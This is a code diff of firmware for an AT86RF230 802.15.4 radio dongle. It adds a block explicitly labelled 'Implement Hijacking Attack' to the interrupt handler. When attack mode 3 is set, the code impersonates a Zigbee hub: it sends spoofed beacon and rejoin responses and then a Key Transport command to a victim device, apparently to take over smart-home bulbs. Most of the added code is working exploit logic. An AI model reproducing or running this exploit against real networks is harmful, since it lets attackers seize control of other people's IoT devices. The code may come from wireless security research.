@@ -27,6 +27,16 @@ uint8_t beacon_request_flag = 0;
 uint8_t tc_rejoin_request_flag = 0;
 uint8_t data_request_flag = 0;
 
+extern uint8_t attack_no;
+extern ieee802154_addr hub_addr;
+extern ieee802154_addr bulb_addr;
+extern ieee802154_addr victim_addr;
+
+uint16_t zero_addr = 0;
+uint8_t response_finish_flag = 0;
+uint8_t beacon_finish_flag = 0;
+rx_aack_config aack_config = {.pending=1};
+
 void reset_cpu(void)
 {
 	WDTCSR = 1 << WDE;
@@ -228,56 +238,6 @@ void clear_flag(void)
 	data_request_flag = 0;
 }
 
-//void detect_packet_type(void)
-//{
-//	uint8_t phy_len = 0;
-//	// uint8_t radius = 0;
-//
-//	// uint8_t flag = 100;
-//
-//	uint8_t fcf[2];
-//	// uint8_t saddr[2];
-//	// uint8_t daddr[2];
-//	// uint8_t dstpan[2];
-//
-//	// uint8_t analyze_nwk = 0;
-//	uint8_t analyze_mac = 1;
-//	// uint8_t command_id = 0;
-//
-//	spi_begin();
-//	spi_io(AT86RF230_BUF_READ);
-//	// Analyze phy len
-//	phy_len = spi_recv();
-//	if (phy_len <= 8) {
-//		spi_end();
-//		return ;
-//	}
-//	// Analyze MAC
-//	if (analyze_mac) {
-//		// Check MAC FCF
-//		_delay_us(32);
-//		fcf[0] = spi_recv();
-//		_delay_us(32);
-//		fcf[1] = spi_recv();
-//		spi_end();
-//		if((fcf[0] == 0x03) && (fcf[1] == 0x08)) // Beacon Request
-//		{
-//			beacon_request_flag = 1;
-//		}
-//		else if ((fcf[0] == 0x61) && (fcf[1] == 0x88)) // NWK Rejoin Request
-//		{
-//			if (phy_len < 35) {
-//				tc_rejoin_request_flag = 1;
-//			}
-//		}
-//		else if ((fcf[0] == 0x63) && (fcf[1] == 0x88)) // Data Request
-//		{
-//			data_request_flag = 1;
-//		}
-//	}
-//	// We need to further judge whether the rejoin is a secure rejoin or not.
-//}
-
 #if defined(ATUSB) || defined(HULUSB)
 ISR(INT0_vect)
 #endif
@@ -297,7 +257,48 @@ ISR(TIMER1_CAPT_vect)
 		{
 			process_incomming_packets();
 		}
-		// detect_packet_type();
+		// Implement Hijacking Attack
+		if (attack_no == 3)
+		{
+			ieee802154_addr fake_hub_addr = hub_addr;
+			aack_config.pass_ARET_check = 0;
+			aack_config.target_short_addr.addr = fake_hub_addr.short_addr;
+			aack_config.target_pan_id.addr = fake_hub_addr.pan;
+			if(beacon_request_flag)
+			{
+				send_zbee_cmd(ZBEE_MAC_CMD_BEACON_RP, 0, &victim_addr, &fake_hub_addr, &aack_config);
+				beacon_finish_flag = 1;
+			}
+			else if (tc_rejoin_request_flag)
+			{
+				if (!aack_config.aack_flag)
+				{
+					aack_config.aack_flag = 1;
+					aack_config.pass_ARET_check = 1;
+					aack_config.pending = 1;
+					set_rx_aack(&aack_config);
+				}
+			}
+			else if (data_request_flag)
+			{
+				if((response_finish_flag == 0) && (beacon_finish_flag == 1))
+				{
+					// Send Rejoin Response first.
+					aack_config.pending = 1;
+					send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RP, 0, &victim_addr, &fake_hub_addr, &aack_config);
+					response_finish_flag = 1;
+				}
+				else if (response_finish_flag == 1)
+				{
+					// Send Key Transport command then.
+					aack_config.pending = 0;
+					send_zbee_cmd(ZBEE_APS_CMD_KEY_TRANSPORT, 1, &victim_addr, &fake_hub_addr, &aack_config);
+					response_finish_flag = 0;
+					beacon_finish_flag = 0;
+				}
+			}
+		}
+		clear_flag();
 	}
 	if (mac_irq) {
 		if (mac_irq())
